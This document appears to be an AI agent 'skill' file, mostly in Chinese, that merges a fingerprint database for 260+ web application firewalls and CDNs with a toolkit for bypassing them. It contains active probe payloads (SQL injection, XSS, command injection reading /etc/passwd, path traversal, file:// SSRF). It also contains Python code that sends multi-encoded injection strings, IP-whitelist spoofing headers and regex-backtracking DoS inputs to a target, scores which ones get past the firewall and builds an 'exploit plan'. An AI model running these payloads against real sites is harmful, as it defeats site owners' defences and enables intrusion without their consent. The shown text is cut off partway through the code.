---
name: waf-bypass
category: reverse-engineering
description: >-
  Merged skill combining: waf-detector, ruishu-reverse.
version: "1.0"
sources:
  - waf-detector
  - ruishu-reverse
tags: [reverse-engineering, merged]
---

# waf-bypass

> **Merged from**: waf-detector, ruishu-reverse
> **Source count**: 2

---

## Table of Contents

1. [waf-detector](#waf-detector)
2. [ruishu-reverse](#ruishu-reverse)

---

## waf-detector

# Web WAF 检测与绕过技能

覆盖 **260+ WAF/CDN/安全产品** 指纹库（融合 wafw00f，9 维度匹配 + 主动探测），自动识别目标 WAF 类型，输出针对性绕过策略 + **850+ 通用 Bypass Payload**（59 类绕过技术，16 大类攻击向量），含 CDN 误报消除引擎、高级 HTTP 协议层绕过技术及实战自动化脚本。

## 触发条件

- WAF 检测 / WAF 识别 / 防火墙检测
- WAF bypass / 绕过 WAF
- SQLi/XSS/LFI/RCE/SSRF payload

---

## 一、检测流程

```
信息收集 → 指纹匹配(5维度) → 自动识别 → 置信度评估 → 输出绕过策略 + Payload
```

---

## 二、260+ WAF 完整指纹库

> 融合 wafw00f 项目，覆盖云服务 / 国产 / 商业 / 开源 / CDN 五大类

### 维度一：HTTP 响应头指纹

#### A. 云服务 WAF (35)

| # | WAF | 响应头特征 |
|---|-----|-----------|
| 1 | Cloudflare | `cf-ray`, `cf-cache-status`, `cf-request-id`, `server: cloudflare` |
| 2 | AWS CloudFront/WAF | `x-amz-cf-id`, `x-amz-cf-pop`, `x-amz-request-id`, `x-amzn-trace-id` |
| 3 | AWS ALB | `server: awselb`, `x-amzn-trace-id` |
| 4 | Azure Front Door/WAF | `x-azure-ref`, `x-ms-request-id`, `server: Microsoft-IIS` |
| 5 | Google Cloud Armor | `x-cloud-trace-context`, `server: Google Frontend`, `via: 1.1 google` |
| 6 | Akamai Kona | `x-akamai-transformed`, `x-akamai-request-id`, `akamai-origin-hop` |
| 7 | Fastly | `x-served-by`, `x-cache-hits`, `x-timer`, `fastly-ff` |
| 8 | Imperva/Incapsula | `x-iinfo`, `x-cdn: Incapsula`, `x-request-id` |
| 9 | Sucuri | `x-sucuri-id`, `x-sucuri-cache`, `server: Sucuri/Cloudproxy` |
| 10 | StackPath | `x-sp-url`, `server: StackPath` |
| 11 | Limelight CDN | `x-limelight-cache-status`, `x-llnw-request-id` |
| 12 | ArvanCloud | `server: ArvanCloud`, `x-arvancloud` |
| 13 | Azion CDN | `server: Azion`, `x-azion-cache` |
| 14 | CacheFly | `server: CacheFly`, `x-cf-cache` |
| 15 | KeyCDN | `server: KeyCDN`, `x-cache-status` |
| 16 | Reblaze | `rbzid`, `server: Reblaze` |
| 17 | Instart DX | `x-instart-cache`, `x-instart-request-id` |
| 18 | DataDome | `x-datadome`, `x-datadome-captcha`, `server: DataDome` |
| 19 | PerimeterX | `x-px`, `x-px-captcha`, `server: PerimeterX` |
| 20 | Section.io | `x-section-io`, `section-io-id` |
| 21 | CDNetworks | `server: CDNetworks`, `x-cdn-cdnet` |
| 22 | CdnNS | `server: CdnNs`, `x-cdnns` |
| 23 | ChinaCache | `server: ChinaCache`, `x-cc-cache` |
| 24 | Yundun (云盾) | `server: yundun`, `x-yundun` |
| 25 | Baidu CDN | `server: yunjiasu`, `yjs_id` |
| 26 | Tencent CDN | `server: Tencent`, `tencent-cdn` |
| 27 | Aliyun CDN | `aliyun_lb`, `x-cdn-for`, `yfx_cdn` |
| 28 | Wangsu (网宿) | `server: wangsu`, `ws-request-id` |
| 29 | Qiniu (七牛) | `x-qiniu`, `x-reqid` |
| 30 | Upyun (又拍) | `x-upyun-cdn`, `server: upyun` |
| 31 | Kingsoft (金山云) | `x-ks-cdn`, `server: kingsoft` |
| 32 | UCloud | `x-ucloud`, `server: ucloud` |
| 33 | JDCloud (京东云) | `x-jdcloud`, `server: jdcloud` |
| 34 | HighWinds | `server: Highwinds`, `x-hw-cache` |
| 35 | Cloudflare Bot Mgmt | `cf-mitigated`, `cf-chl-bypass` |

#### B. 国产 WAF (30)

| # | WAF | 响应头特征 |
|---|-----|-----------|
| 36 | 阿里云 WAF | `aliyun_lb`, `ALI-LB`, `eagleeye-traceid` |
| 37 | 腾讯云 WAF | `server: Tencent`, `EO-LOG-UUID` |
| 38 | 华为云 WAF | `server: HWS`, `x-huawei-` |
| 39 | 百度云加速 | `server: yunjiasu`, `yjs_id` |
| 40 | 长亭 SafeLine | `sl-session`, `safeline`, `sl-ce-suid` |
| 41 | 知道创宇 (创宇盾) | `server: KSC/`, `x-kong-`, `knownsec` |
| 42 | 深信服 (Sangfor) | `server: sangfor`, `x-sangfor` |
| 43 | 绿盟 (NSFOCUS) | `server: NSFOCUS`, `x-nsfocus` |
| 44 | 天融信 (TopSec) | `server: TopSec`, `x-topsec` |
| 45 | 山石网科 (Hillstone) | `server: Hillstone`, `x-hillstone` |
| 46 | 启明星辰 (Venusense) | `server: Venusense`, `x-venusense` |
| 47 | 安恒 (DBAppSecurity) | `server: DBAppSecurity`, `x-dbapp` |
| 48 | 360 网站卫士 | `server: 360wzb`, `x-360wzb` |
| 49 | 360 防火墙 | `server: 360`, `x-360` |
| 50 | 安全狗 | `server: safedog`, `x-safedog` |
| 51 | 云锁 | `server: yunsuo`, `x-yunsuo` |
| 52 | D 盾 | `server: dshield`, `x-dshield` |
| 53 | 护卫神 | `server: hws`, `x-hws` |
| 54 | 悬镜 | `server: xmirror`, `x-xmirror` |
| 55 | 安骑士 | `server: aegis`, `x-aegis` |
| 56 | 阿里云盾 | `server: aliyundun`, `YUNDUN` |
| 57 | 腾讯门神 | `server: tencent_waf`, `x-mensheng` |
| 58 | 创宇盾 | `server: cyd`, `x-cyd` |
| 59 | 加速乐 | `server: jiasule`, `x-jiasule` |
| 60 | AnYu (安御) | `server: anyu`, `x-anyu` |
| 61 | Anquanbao (安全宝) | `server: anquanbao`, `x-anquanbao` |
| 62 | Bluedon (蓝盾) | `server: bluedon`, `x-bluedon` |
| 63 | Approach | `server: approach`, `x-approach` |
| 64 | Puhui (普惠) | `server: puhui`, `x-puhui` |
| 65 | Safe3 | `server: safe3`, `x-safe3` |

#### C. 商业 WAF (55)

| # | WAF | 响应头特征 |
|---|-----|-----------|
| 66 | F5 BIG-IP ASM | `x-wa-info`, `x-cnection`, `server: BigIP` |
| 67 | F5 BIG-IP APM | `MRHSession`, `LastMRH_Session`, `F5_ST` |
| 68 | F5 Silverline | `x-sf-`, `x-sfproxy`, `server: F5` |
| 69 | F5 FirePass | `server: FirePass`, `x-firepass` |
| 70 | F5 TrafficShield | `server: TrafficShield`, `x-ts-` |
| 71 | FortiWeb | `fortiwafsid`, `server: FortiWeb` |
| 72 | Barracuda WAF | `BNI_persistence`, `barra_counter_session` |
| 73 | Citrix NetScaler | `ns_af`, `NS-CACHE`, `server: NetScaler` |
| 74 | Radware AppWall | `X-SL-CompState`, `server: AppWall` |
| 75 | Imperva SecureSphere | `x-iinfo`, `MPulse`, `x-request-id` |
| 76 | Airlock | `AL-SESS`, `AL-LB`, `server: Airlock` |
| 77 | DenyAll | `sessioncookie`, `server: DenyAll` |
| 78 | Wallarm | `x-wallarm`, `server: wallarm` |
| 79 | Distil | `x-distil`, `x-distil-cs` |
| 80 | Cloudbric | `server: Cloudbric`, `set-cookie: Cloudbric` |
| 81 | Edgecast/Verizon | `server: ECD`, `x-ec-cache` |
| 82 | SiteLock TrueShield | `x-sitelock`, `x-trueshield` |
| 83 | Comodo cWatch | `server: cw`, `server: Comodo` |
| 84 | Janusec | `server: Janusec`, `x-janusec` |
| 85 | Armor | `server: Armor`, `x-armor` |
| 86 | DOSarrest | `server: DOSarrest`, `x-dosarrest` |
| 87 | HyperGuard | `server: HyperGuard`, `x-hyperguard` |
| 88 | NetContinuum | `server: NetContinuum`, `x-nc-` |
| 89 | NevisProxy | `server: Nevis`, `x-nevis` |
| 90 | BinarySec | `server: BinarySec`, `x-binarysec` |
| 91 | Profense | `server: Profense`, `x-profense` |
| 92 | WatchGuard | `server: WatchGuard`, `x-watchguard` |
| 93 | SonicWall | `server: SonicWALL`, `x-sonicwall` |
| 94 | Palo Alto | `server: PaloAlto`, `x-paloalto` |
| 95 | Oracle WAF | `server: Oracle`, `x-oracle` |
| 96 | Alert Logic | `server: AlertLogic`, `x-alertlogic` |
| 97 | IndusGuard | `server: IndusGuard`, `x-indusguard` |
| 98 | Secure Entry (IBM) | `server: IBM`, `x-ibm-waf` |
| 99 | eEye Digital Security | `server: eEye`, `x-eeye` |
| 100 | Sabre | `server: Sabre`, `x-sabre` |
| 101 | Mission Control | `server: MissionControl`, `x-mc-` |
| 102 | Greywizard | `server: Greywizard`, `x-greywizard` |
| 103 | Bekchy | `server: Bekchy`, `x-bekchy` |
| 104 | Dozant | `server: Dozant`, `x-dozant` |
| 105 | Viettel | `server: Viettel`, `x-viettel` |
| 106 | Eisoo | `server: Eisoo`, `x-eisoo` |
| 107 | CrawlProtect | `server: CrawlProtect`, `x-crawlprotect` |
| 108 | PentaWAF | `server: PentaWAF`, `x-pentawaf` |
| 109 | XLabs Security | `server: XLabs`, `x-xlabs` |
| 110 | Zenedge | `server: Zenedge`, `x-zenedge` |
| 111 | ZScaler | `server: ZScaler`, `x-zscaler` |
| 112 | ShieldSquare | `server: ShieldSquare`, `x-shieldsquare` |
| 113 | BitNinja | `server: BitNinja`, `x-bitninja` |
| 114 | BlockDoS | `server: BlockDoS`, `x-blockdos` |
| 115 | NullDDoS | `server: NullDDoS`, `x-nullddos` |
| 116 | DDos-Guard | `server: DDos-Guard`, `x-ddg` |
| 117 | GoDaddy WAF | `server: GoDaddy`, `x-gd-waf` |
| 118 | SiteGround | `server: SiteGround`, `x-sg-waf` |
| 119 | WTS-WAF | `server: WTS`, `x-wts` |
| 120 | PowerCDN | `server: PowerCDN`, `x-pcdn` |

#### D. 开源 WAF (25)

| # | WAF | 响应头特征 |
|---|-----|-----------|
| 121 | ModSecurity | `server: Apache` + 拦截行为, `mod_security` |
| 122 | NAXSI (Nginx) | `x-naxsi-sig`, `server: nginx` + 拦截行为 |
| 123 | OpenResty WAF | `server: openresty`, `x-or-lb` |
| 124 | Varnish | `x-varnish`, `via: ...varnish` |
| 125 | Squid Proxy | `x-squid-error`, `server: squid` |
| 126 | Shadow Daemon | `x-shadowd`, `server: shadowd` |
| 127 | Wordfence | `wordfence_`, `server: nginx` + `wf` 行为 |
| 128 | BulletProof Security | `BPS`, `bpspro` |
| 129 | UrlScan (IIS) | `server: Microsoft-IIS`, `Rejected-By-UrlScan` |
| 130 | NinjaFirewall | `server: NinjaFirewall`, `x-ninja` |
| 131 | phpFireWall | `server: phpFireWall`, `x-phpfirewall` |
| 132 | phpSecurity | `server: phpSecurity`, `x-phpsecurity` |
| 133 | RSFirewall | `server: RSFirewall`, `x-rsfirewall` |
| 134 | SecuPress | `server: SecuPress`, `x-secupress` |
| 135 | WebARX | `server: WebARX`, `x-webarx` |
| 136 | Malcare | `server: Malcare`, `x-malcare` |
| 137 | Atomicorp | `server: Atomicorp`, `x-atomicorp` |
| 138 | ASP.NET Generic | `server: Microsoft-IIS`, `X-AspNet-Version` |
| 139 | ISAServer | `server: Microsoft-IIS`, `x-isaserver` |
| 140 | Plesk | `server: Plesk`, `x-plesk` |
| 141 | Expression Engine | `server: ExpressionEngine`, `x-ee` |
| 142 | aeSecure | `server: aeSecure`, `x-aesecure` |
| 143 | LiteSpeed | `server: LiteSpeed`, `x-litespeed` |
| 144 | CacheWall | `x-cachewall`, `server: Varnish` |
| 145 | WebKnight | `server: WebKnight`, `x-webknight` |

### 维度二：Cookie 指纹

```python
WAF_COOKIE_SIGNATURES = {
    # 云服务
    "Cloudflare": ["__cfduid", "cf_clearance", "cf_chl_rc_m", "cf_chl_2", "cf_chl_prog", "cf_use_ob"],
    "Imperva": ["visid_incap_", "incap_ses_", "nlbi_", "reese84", "incap_ind"],
    "AWS WAF": ["aws-waf-token", "AWSALB", "AWSALBCORS"],
    "Akamai": ["ak_bmsc", "bm_sz", "_abck", "akamai_"],
    "DataDome": ["datadome", "datadome_consent"],
    "PerimeterX": ["_px", "_pxhd", "_pxff", "_px3"],
    "Reblaze": ["rbzid", "rbz_sessionid"],
    "Sucuri": ["sucuri_cloudproxy_uuid_", "sucuri_privacy"],
    "Instart DX": ["instarthash", "insession"],
    # 商业硬件
    "F5 BIG-IP": ["TS", "TS01", "TS01e", "F5_fullWT", "BIGipServer", "MRHSession", "LastMRH_Session", "F5_ST"],
    "FortiWeb": ["cookiesession1", "fortiwafsid"],
    "Citrix NetScaler": ["citrix_ns_id", "NSC_", "nsr", "ns_af"],
    "Barracuda": ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE", "BNI_persistence"],
    "Radware": ["apdc", "dtCookie"],
    "Airlock": ["AL-SESS", "AL-LB", "AL-DC"],
    "DenyAll": ["DASID", "da_rcookie"],
    "Distil": ["distil_"],
    "Cloudbric": ["Cloudbric", "cloudbric_"],
    "Comodo": ["cw_cookie", "cwatch_"],
    "Wordfence": ["wfvt_", "wordfence_verifiedHuman"],
    # 国产
    "阿里云 WAF": ["aliyungf_tc", "aliyun_lb_", "aliyun_lang"],
    "腾讯云 WAF": ["tencent_waf", "tgw_"],
    "华为云 WAF": ["HWWAF", "hwwaf"],
    "长亭 SafeLine": ["sl-session", "sl-ce-suid", "safeline"],
    "知道创宇": ["ksc_", "knownsec_"],
    "深信服": ["SANGFOR", "sangfor_"],
    "绿盟": ["NSFOCUS", "nsfocus_"],
    "天融信": ["TWC", "topsec_"],
    "百度云加速": ["yjs_id", "yjs_"],
    "安全狗": ["safedog", "sd_"],
    "云锁": ["yunsuo_session", "yunsuo_"],
    "360 网站卫士": ["360wzb", "__jsluid"],
    "创宇盾": ["cyd_", "jiasule_"],
    "加速乐": ["jsluid", "jiasule_"],
}
```

### 维度三：拦截状态码

| WAF | 典型拦截状态码 | 备注 |
|-----|------------|------|
| Cloudflare | 403, 503, **1020** | 1020 是 Cloudflare 特有 |
| ModSecurity | 403, 406, 501 | 406 常见于 ModSecurity |
| NAXSI | 403, 406 | |
| AWS WAF | 403, 405 | |
| Azure WAF | 403, 200 + 拦截页面 | |
| Imperva | 403, 406, 412 | 412 用于 protocol violation |
| F5 ASM | 200 + 拦截页面, 503, 302 | |
| Sucuri | 403 | |
| Akamai | 403, 503, 302 | 302 到 JS Challenge |
| FortiWeb | 403, 200 + 拦截页面 | |
| 阿里云 WAF | 405, 200 + 拦截页面 | |
| 腾讯云 WAF | 200 + 拦截页面, 403 | |
| 华为云 WAF | 403, 418 | 418 为挑战验证 |
| 百度云加速 | 403, 503 | |
| 深信服 | 200 + 拦截页面, 403 | |
| 绿盟 | 200 + 拦截页面, 403 | |
| 天融信 | 403, 200 + 拦截页面 | |
| Radware | 403, 406 | |
| Barracuda | 403, 200 + 拦截页面 | |
| Citrix NetScaler | 403, 200 + 拦截页面 | |
| Google Cloud Armor | 403, 502 | |
| Fastly | 403, 503 | |
| DataDome | 403, 503 | |
| PerimeterX | 403, 503 | |
| WebKnight | 403, 406 | |
| BitNinja | 403, 503 | |
| DDos-Guard | 403, 503 | |
| Anquanbao | 405, 200 + 拦截页面 | |
| Safe3 | 403, 200 + 拦截页面 | |
| Bluedon | 403, 200 + 拦截页面 | |

### 维度四：响应体拦截内容

```python
WAF_BODY_SIGNATURES = {
    # 云服务
    "Cloudflare": ["Cloudflare Ray ID:", "cf-browser-verification", "cdn-cgi/challenge-platform", "DDoS protection by Cloudflare", "Just a moment..."],
    "Imperva": ["Incapsula incident ID:", "_Incapsula_Resource", "Request unsuccessful. Incapsula", "Powered by Incapsula"],
    "Sucuri": ["Sucuri WebSite Firewall", "Access Denied - Sucuri", "sucuri.net/privacy-policy", "Sucuri/CloudProxy"],
    "AWS WAF": ["Request blocked.", "AWS WAF", "request could not be satisfied", "Generated by cloudfront"],
    "Azure WAF": ["Azure Web Application Firewall", "Microsoft-Azure-Application-Gateway"],
    "Akamai": ["Access Denied", "Reference #", "akamai.com", "Edge Suite", "akamaihd"],
    "Google Cloud Armor": ["Google Cloud Armor", "Request blocked by Google"],
    "DataDome": ["DataDome", "datadome.co", "Protected by DataDome"],
    "PerimeterX": ["PerimeterX", "px-captcha", "press & hold"],
    "Fastly": ["Fastly", "fastly edge"],
    "Reblaze": ["Reblaze", "rbzid", "Reblaze Web Security"],
    "Distil": ["Distil", "distil", "Distil Networks"],
    # 商业硬件
    "F5 BIG-IP": ["The requested URL was rejected", "Please consult with your administrator", "Your support ID is:", "F5 Networks", "Application Security Manager"],
    "FortiWeb": ["FortiWeb Application Firewall", "FortiWeb -", "The server denied the specified Uniform Resource Locator"],
    "Barracuda": ["Barracuda Networks", "barracuda.com", "Barracuda Web Application Firewall"],
    "Citrix NetScaler": ["Citrix NetScaler", "NS-CACHE", "Application Firewall", "Citrix ADC"],
    "Radware": ["Radware", "AppWall", "Unauthorized Activity", "Radware Security"],
    "Airlock": ["Airlock", "Ergon", "Airlock WAF"],
    "Wallarm": ["Wallarm", "wallarm", "Wallarm WAF"],
    "WebKnight": ["WebKnight", "AQTRONIX WebKnight", "Security Alert"],
    "DOSarrest": ["DOSarrest", "DOS Arrest"],
    "HyperGuard": ["HyperGuard", "hyperguard"],
    "BinarySec": ["BinarySec", "binarysec"],
    "NetContinuum": ["NetContinuum", "NetContinuum Firewall"],
    # 国产
    "阿里云 WAF": ["阿里云 Web应用防火墙", "aliyun.com", "云盾", "AliyunWAF", "aliyundun", "YUNDUN"],
    "腾讯云 WAF": ["腾讯云WAF", "腾讯云Web应用防火墙", "cloud.tencent.com", "腾讯安全", "门神"],
    "华为云 WAF": ["华为云WAF", "华为云Web应用防火墙", "huaweicloud.com", "HUAWEI CLOUD WAF"],
    "百度云加速": ["百度云加速", "百度云防护", "yunjiasu", "云加速防护", "百度安全验证"],
    "长亭 SafeLine": ["SafeLine", "长亭", "chaitin", "雷池", "长亭科技", "chaitin.cn"],
    "知道创宇": ["知道创宇", "KSC", "knownsec", "创宇盾", "加速乐", "knownsec.com", "创宇云防御"],
    "深信服": ["深信服", "Sangfor", "SANGFOR", "深信服下一代防火墙", "sangfor.com.cn"],
    "绿盟": ["绿盟", "NSFOCUS", "nsfocus", "绿盟科技", "绿盟WAF", "nsfocus.com"],
    "天融信": ["天融信", "TopSec", "topsec", "天融信防火墙", "topsec.com.cn"],
    "山石网科": ["山石网科", "Hillstone", "hillstone", "山石防火墙"],
    "启明星辰": ["启明星辰", "Venusense", "天清", "天阗"],
    "安恒": ["安恒", "DBAppSecurity", "明御", "安恒信息", "DAS-WAF"],
    "安全狗": ["安全狗", "safedog", "SafeDog"],
    "云锁": ["云锁", "yunsuo", "YunSuo"],
    "360 网站卫士": ["360网站卫士", "360wzb", "360安全"],
    "Anquanbao": ["安全宝", "anquanbao", "AnQuanBao"],
    "Bluedon": ["蓝盾", "Bluedon", "bluedon"],
    "Safe3": ["Safe3", "safe3 WAF"],
    "AnYu": ["安御", "AnYu", "anyu"],
    # 开源
    "ModSecurity": ["ModSecurity", "This error was generated by Mod_Security", "mod_security", "OWASP ModSecurity"],
    "NAXSI": ["NAXSI", "naxsi", "Request Denied", "NX_"],
    "Wordfence": ["Wordfence", "Wordfence Security", "wordfence.com"],
    "Shadow Daemon": ["Shadow Daemon", "shadowd", "shadow daemon"],
    "UrlScan": ["UrlScan", "urlscan", "Rejected-By-UrlScan"],
    "BulletProof Security": ["BPS", "BulletProof Security", "bpspro"],
    "NinjaFirewall": ["NinjaFirewall", "ninja firewall"],
    "RSFirewall": ["RSFirewall", "rsfirewall"],
    "SecuPress": ["SecuPress", "secupress"],
    "CacheWall": ["CacheWall", "cachewall"],
    "aeSecure": ["aeSecure", "aesecure"],
    "CrawlProtect": ["CrawlProtect", "crawl protect"],
    "PentaWAF": ["PentaWAF", "pentawaf"],
    "Expression Engine": ["ExpressionEngine", "Expression Engine"],
}
```

### 维度五：HTML 页面标题

```python
WAF_TITLE_PATTERNS = {
    "Cloudflare": ["Attention Required", "Just a moment", "Checking your browser", "DDoS protection"],
    "Sucuri": ["Sucuri WebSite Firewall", "Access Denied", "Website Firewall"],
    "Imperva": ["Incapsula", "Unauthorized", "Security Check"],
    "F5": ["Request rejected", "Security", "Blocked"],
    "FortiWeb": ["FortiWeb", "Application Firewall"],
    "AWS WAF": ["Request blocked", "403 Forbidden"],
    "Azure WAF": ["Azure WAF", "Blocked", "Microsoft Azure"],
    "阿里云 WAF": ["阿里云WAF", "云盾", "访问被拦截"],
    "腾讯云 WAF": ["腾讯云WAF", "Web应用防火墙", "腾讯云安全拦截"],
    "华为云 WAF": ["华为云WAF", "华为云 Web应用防火墙"],
    "深信服": ["深信服", "Sangfor", "安全拦截"],
    "绿盟": ["绿盟", "NSFOCUS", "安全防护"],
    "长亭": ["SafeLine", "长亭", "雷池"],
    "知道创宇": ["知道创宇", "创宇盾", "加速乐"],
    "ModSecurity": ["ModSecurity", "Forbidden", "Not Acceptable"],
    "Akamai": ["Access Denied", "Reference", "Akamai"],
    "百度云加速": ["百度云加速", "云防护", "安全验证"],
    "DataDome": ["DataDome", "Protected by"],
    "PerimeterX": ["PerimeterX", "Press & Hold"],
    "安全狗": ["安全狗", "SafeDog"],
    "云锁": ["云锁", "YunSuo"],
    "360 网站卫士": ["360网站卫士", "360安全"],
    "Anquanbao": ["安全宝", "AnQuanBao"],
    "Bluedon": ["蓝盾", "Bluedon"],
}
```

---

### 维度六：主动探测 Payload（Active Probe）

> 发送精心构造的攻击载荷，分析 WAF 对各类攻击的响应差异，实现行为指纹识别

| 探测类别 | 探测 Payload | 预期检测目标 | 响应特征 |
|---------|-------------|-------------|---------|
| **SQLi 注入** | `?id=1' OR 1=1-- ` | 通用 SQLi 拦截 | 403/406/拦截页面 |
| **XSS 反射** | `?q=<script>alert(1)</script>` | 通用 XSS 拦截 | 403/406/拦截页面 |
| **路径遍历** | `?file=../../../../etc/passwd` | 通用 LFI 拦截 | 403/404/拦截页面 |
| **命令注入** | `?cmd=;cat /etc/passwd` | 通用 CMD 拦截 | 403/拦截页面 |
| **协议探测** | `?url=file:///etc/passwd` | SSRF 检测 | 403/拦截页面 |
| **Cloudflare 探测** | `?q=../../../../etc/passwd%00` | CF 特有的空字节防护 | 1020/403 + CF Ray ID |
| **ModSecurity 探测** | `?id=1 union select 1,2,3` | ModSecurity SQLi 规则 | 403/406/Not Acceptable |
| **AWS WAF 探测** | 添加 `X-Forwarded-For: 127.0.0.1` 头 | AWS IP 规则 | 403/405 + X-Amz-* |
| **阿里云WAF 探测** | `?q=../../../etc/passwd` | 阿里云路径遍历规则 | 405 + 阿里云错误页 |
| **腾讯云WAF 探测** | `?id=1 and 1=1` | 腾讯云 SQLi 规则 | 403 + 腾讯云错误页 |
| **FortiWeb 探测** | `?id=1%20union%20select` | FortiWeb 编码检测 | 403 + FortiWeb 头 |
| **F5 ASM 探测** | 添加 `X-Cnection: close` | F5 特征检测 | 自定义错误页 |
| **Imperva 探测** | `?id=1' and '1'='1` | Imperva SQLi 规则 | 403 + Imperva 错误页 |
| **Barracuda 探测** | `?q=<script>alert('xss')</script>` | Barracuda XSS 规则 | 403 + Barracuda 头 |
| **Sucuri 探测** | `?q=<script>document.cookie</script>` | Sucuri XSS 规则 | 403 + Sucuri 头 |
| **Wordfence 探测** | WordFence 404 页面探测 | 非标准路径 | 403 + 自定义 Wordfence 模板 |
| **长亭雷池 探测** | `?id=1/**/union/**/select` | 长亭注释绕过检测 | 403 + 长亭特征 |
| **安全狗 探测** | `?id=1%20union%20select` | 安全狗 URL 编码检测 | 403 + safedog 头 |
| **云锁 探测** | `?id=1' and '1'='1` | 云锁 SQLi 检测 | 405 + yunsuo 拦截页 |
| **Nginx WAF 探测** | 发送超大请求体 | Nginx WAF 大小限制 | 413/Request Entity Too Large |
| **Apache WAF 探测** | 发送超长 URL | Apache WAF 长度限制 | 414/Request-URI Too Long |

### 维度七：行为指纹分析（Behavioral Fingerprinting）

---
*[Content truncated: 25346 lines total]*
---

            },
        ],
        "FortiWeb": [
            {
                "conflict_type": RuleConflictType.REGEX_BACKTRACK,
                "description": "FortiWeb 自定义规则中的嵌套量词导致回溯",
                "exploit_payload": "a" * 50 + "!",
                "bypass_technique": "正则回溯 DoS 触发 FortiWeb 降级",
            },
        ],
        "阿里云WAF": [
            {
                "conflict_type": RuleConflictType.TRANSFORMATION,
                "description": "阿里云WAF HTTP/2 降级到 HTTP/1.1 时的不一致",
                "exploit_payload": "HTTP/2 走私 + HTTP/1.1 降级",
                "bypass_technique": "协议降级导致规则不一致",
            },
        ],
    }

    def __init__(self, waf_type: str = "未知", target: str = ""):
        self.waf_type = waf_type
        self.target = target
        self.rules: List[WAFRule] = []
        self.conflicts: List[RuleConflict] = []
        self.session = aiohttp.ClientSession()

    def get_known_conflicts(self) -> List[Dict]:
        """获取已知 WAF 规则冲突"""
        waf_key = self._match_waf()
        return self.KNOWN_CONFLICTS.get(waf_key, [])

    def _match_waf(self) -> str:
        """匹配 WAF 类型"""
        waf_lower = self.waf_type.lower()
        if "modsecurity" in waf_lower or "mod_security" in waf_lower:
            return "ModSecurity"
        elif "cloudflare" in waf_lower:
            return "Cloudflare"
        elif "aws" in waf_lower:
            return "AWS WAF"
        elif "f5" in waf_lower or "big-ip" in waf_lower:
            return "F5 BIG-IP"
        elif "imperva" in waf_lower or "incapsula" in waf_lower:
            return "Imperva"
        elif "fortiweb" in waf_lower or "fortinet" in waf_lower:
            return "FortiWeb"
        elif "阿里云" in self.waf_type:
            return "阿里云WAF"
        return "ModSecurity"

    def detect_regex_backtrack_dos(self, pattern: str) -> Dict[str, Any]:
        """检测正则回溯 DoS 漏洞"""
        result = {
            "pattern": pattern, "vulnerable": False,
            "backtrack_depth": 0, "dangerous_patterns": [], "execution_time_ms": 0,
        }
        dangerous_patterns = [
            r"\(a\+\)\+", r"\(\.\*\)\+", r"\(\.\+\)\+",
            r"\.\*\.\*", r"\(\[\\w\\W\]\*\)\*", r"\(\?:\.\*\)\{2,\}",
            r"\(\.\*\)\{2,\}", r"\.\*\.\+", r"\(\?:\.\*\|\.\+\)\+",
            r"\(\[\\s\\S\]\*\)\+",
        ]
        for dp in dangerous_patterns:
            if re.search(dp, pattern):
                result["dangerous_patterns"].append(dp)
                result["vulnerable"] = True
        if result["vulnerable"]:
            test_strings = ["a" * 10 + "!", "a" * 20 + "!", "a" * 30 + "!", "a" * 50 + "!"]
            for test_str in test_strings:
                try:
                    start = time.time()
                    re.match(pattern, test_str)
                    elapsed = (time.time() - start) * 1000
                    result["execution_time_ms"] = max(result["execution_time_ms"], elapsed)
                    result["backtrack_depth"] = len(test_str) - 1
                except:
                    result["vulnerable"] = True
                    break
        return result

    def generate_conflict_payloads(self) -> List[Dict]:
        """生成规则冲突利用 payload"""
        known = self.get_known_conflicts()
        payloads = []
        for conflict in known:
            payloads.append({
                "conflict_type": conflict["conflict_type"].value if isinstance(conflict["conflict_type"], RuleConflictType) else conflict["conflict_type"],
                "description": conflict["description"],
                "payload": conflict["exploit_payload"],
                "technique": conflict["bypass_technique"],
                "waf": self.waf_type,
            })
        generic_conflicts = [
            {"conflict_type": "TRANSFORMATION", "description": "Content-Type 与 Body 不一致导致检测跳过", "payload": "application/json Content-Type with URL-encoded body", "technique": "Content-Type 混淆"},
            {"conflict_type": "DECODE_ORDER", "description": "多层编码混淆 WAF 解码器", "payload": "U%4ENION%252F%252A%252AS%45LECT", "technique": "三重 URL 编码"},
            {"conflict_type": "PRIORITY_OVERRIDE", "description": "利用 IP 白名单发送攻击", "payload": "X-Forwarded-For: 127.0.0.1", "technique": "IP 白名单欺骗"},
            {"conflict_type": "RULE_RACE", "description": "规则执行间隙发送攻击", "payload": "timing-based attack between rule evaluations", "technique": "规则执行竞态"},
            {"conflict_type": "NEGATIVE_POSITIVE", "description": "利用白名单路径绕过", "payload": "/static/../../../etc/passwd", "technique": "路径白名单 + 路径遍历"},
            {"conflict_type": "PARTIAL_OVERLAP", "description": "两条规则覆盖范围重叠导致绕过", "payload": "SQLi in Cookie header", "technique": "弱规则覆盖范围利用"},
            {"conflict_type": "REGEX_BACKTRACK", "description": "通用正则回溯 DoS 攻击", "payload": "a" * 100 + " OR 1=1--", "technique": "正则回溯 DoS"},
        ]
        payloads.extend(generic_conflicts)
        return payloads

    async def test_conflict_payloads(self) -> Dict[str, Any]:
        """测试冲突 payload 的有效性"""
        if not self.target:
            return {"error": "未指定目标"}
        payloads = self.generate_conflict_payloads()
        results = []
        for payload in payloads:
            try:
                url = f"{self.target}/?q={payload['payload']}"
                async with self.session.get(url, timeout=15, ssl=False) as resp:
                    body = await resp.text()
                    is_blocked = resp.status in [403, 406, 501, 503, 429]
                    is_waf_block = any(ind in body.lower() for ind in [
                        "blocked", "denied", "forbidden", "waf", "firewall",
                        "您的请求被拦截", "访问被拒绝", "非法请求",
                    ])
                    results.append({
                        "payload": payload["payload"][:100],
                        "technique": payload["technique"],
                        "status": resp.status,
                        "blocked": is_blocked or is_waf_block,
                        "bypass_success": not (is_blocked or is_waf_block),
                        "response_size": len(body),
                    })
            except Exception as e:
                results.append({"payload": payload["payload"][:100], "technique": payload["technique"], "error": str(e)})
        successful = [r for r in results if r.get("bypass_success")]
        return {
            "target": self.target,
            "waf_type": self.waf_type,
            "total_tested": len(results),
            "bypass_count": len(successful),
            "bypass_rate": len(successful) / len(results) * 100 if results else 0,
            "results": results,
        }

    def generate_exploit_plan(self) -> Dict[str, Any]:
        """生成利用计划"""
        conflicts = self.get_known_conflicts()
        plan = {
            "waf_type": self.waf_type,
            "total_conflicts": len(conflicts),
            "exploit_phases": [],
            "recommended_order": [
                "1. 先尝试正则回溯 DoS (如果存在)，触发 WAF 降级",
                "2. 利用解码顺序冲突发送多重编码 payload",
